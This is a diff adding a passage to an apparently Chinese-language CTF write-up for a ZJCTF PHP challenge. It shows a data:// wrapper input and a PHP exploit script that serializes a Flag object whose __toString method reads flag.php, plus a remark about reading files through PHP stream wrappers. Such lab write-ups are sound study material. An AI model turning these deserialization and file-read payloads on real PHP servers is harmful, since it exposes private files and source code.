@@ -323,3 +323,25 @@ if(2===3){
 ?text=data://text/plain,welcome to the zjctf
 ```
 
+最后是一个反序列化的利用，利用反序列化去读取flag.php在打开源码可得flag
+exp：
+```php
+<?php
+
+class Flag{  //flag.php
+    public $file;
+    public function __tostring(){
+        if(isset($this->file)){
+            echo file_get_contents($this->file);
+            echo "<br>";
+            return ("U R SO CLOSE !///COME ON PLZ");
+        }
+    }
+}
+
+$flag = new Flag();
+$flag->file = "flag.php";
+echo serialize($flag);
+```
+![500](assets/Day%204/file-20251222013156041.png)
+（好像除了index.php之外都并不是直接给的，但是我们也只需要利用php伪协议去读取就好了）
